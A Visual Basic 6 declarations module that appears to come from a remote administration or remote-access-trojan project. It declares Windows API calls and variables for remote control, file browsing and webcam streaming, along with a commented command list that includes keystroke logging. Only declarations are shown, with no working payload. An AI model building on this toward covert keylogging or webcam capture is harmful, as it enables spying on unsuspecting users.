Attribute VB_Name = "basDeclare"
Public FileTransfer As New clsFileTransfer


'Misc
Declare Function ReleaseCapture Lib "user32" () As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Const WM_NCLBUTTONDOWN = &HA1
Public Const HTCAPTION = 2
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

'Remote Control Variables
Public iImageData As Picture

'File Manager Variables
Public LastPath As String
Public Const MAX_PATH = 260
Public Type BrowseInfo
    hWndOwner As Long
    pIDLRoot As Long
    pszDisplayName As Long
    lpszTitle As Long
    ulFlags As Long
    lpfnCallback As Long
    lParam As Long
    iImage As Long
End Type

Public Type SH_ITEM_ID
    cb As Long
    abID As Byte
End Type

Public Type ITEMIDLIST
    mkid As SH_ITEM_ID
End Type

Public Const WM_USER = &H400
Public Const BFFM_INITIALIZED = 1
Public Const BFFM_SELCHANGED = 2
Public Const BFFM_SETSTATUSTEXT = (WM_USER + 100)
Public Const BFFM_SETSELECTION = (WM_USER + 102)
Public Const BIF_DEFAULT = &H0
Public Const BIF_RETURNONLYFSDIRS = &H1 ' only local Directory
Public Const BIF_DONTGOBELOWDOMAIN = &H2
Public Const BIF_STATUSTEXT = &H4 ' Not With BIF_NEWDIALOGSTYLE
Public Const BIF_RETURNFSANCESTORS = &H8
Public Const BIF_EDITBOX = &H10
Public Const BIF_VALIDATE = &H20 ' use With BIF_EDITBOX or BIF_USENEWUI    Private Const BIF_NEWDIALOGSTYLE = &H40 ' Use OleInitialize before
Public Const BIF_USENEWUI = &H50 ' = (BIF_NEWDIALOGSTYLE + BIF_EDITBOX)
Public Const BIF_BROWSEINCLUDEURLS = &H80
Public Const BIF_UAHINT = &H100 ' use With BIF_NEWDIALOGSTYLE, add Usage Hint if no EditBox
Public Const BIF_NONEWFOLDERBUTTON = &H200
Public Const BIF_NOTRANSLATETARGETS = &H400
Public Const BIF_BROWSEFORCOMPUTER = &H1000
Public Const BIF_BROWSEFORPRINTER = &H2000
Public Const BIF_BROWSEINCLUDEFILES = &H4000
Public Const BIF_SHAREABLE = &H8000 ' use With BIF_NEWDIALOGSTYLE

Public Declare Sub OleInitialize Lib "ole32.dll" (pvReserved As Any)
Public m_CurrentDirectory As String
Public Declare Function PathIsDirectory Lib "shlwapi.dll" Alias "PathIsDirectoryA" (ByVal pszPath As String) As Long
Public Declare Function SHBrowseForFolder Lib "shell32.dll" (lpbi As BrowseInfo) As Long
Public Declare Function SHGetPathFromIDList Lib "shell32.dll" (ByVal pidList As Long, ByVal lpBuffer As String) As Long
Public Declare Sub CoTaskMemFree Lib "ole32.dll" (ByVal hMem As Long)
Public Declare Function lstrcat Lib "Kernel32.dll" Alias "lstrcatA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long
Public Declare Function SHParseDisplayName Lib "shell32.dll" (ByVal pszName As Long, ByVal pbc As Long, ByRef ppidl As Long, ByVal sfgaoIn As Long, ByRef psfgaoOut As Long) As Long
Public Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hWndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long

'Webcam Variables
Public WebcamStream As Boolean
Public WebcamFileNumber As Single
Public WebcamReceived As Single
Public WebcamOpen As Boolean
Public WebcamFPS As Single
Public CaptureOpen As Boolean


Public Received As Single
Public Sent As Single

'Command variable
'Public Const CError As Byte = Chr(0)
'Public Const CConnecct As Byte = Chr(1)
'Public Const CChat As Byte = Chr(2)
'Public Const CSysInfo As Byte = Chr(3)
'Public Const CResponse As Byte = Chr(4)
'Public Const CProcess As Byte = Chr(5)
'Public Const CWindow As Byte = Chr(6)
'Public Const CRemoteControl As Byte = Chr(7)
'Public Const CRCBlockData As Byte = Chr(8)
'Public Const CFileData As Byte = Chr(9)
'Public Const CFileAction As Byte = Chr(10)
'Public Const COldLogs As Byte = Chr(11)
'Public Const CKeyLog As Byte = Chr(12)
'Public Const CBounce As Byte = Chr(13)
'Public Const CSettings As Byte = Chr(14)

    '"error"
    ' "connect"
    ' "chat"
    ' "sysinfo"
    ' "response"
    ' "file"
    ' "transfer"
    ' "process"
    ' "window"
    ' "rc"
    ' "fd"
    ' "faction"
    ' "oldlogs"
    ' "kl" 'key log
    ' "bounce"
    ' "settings"
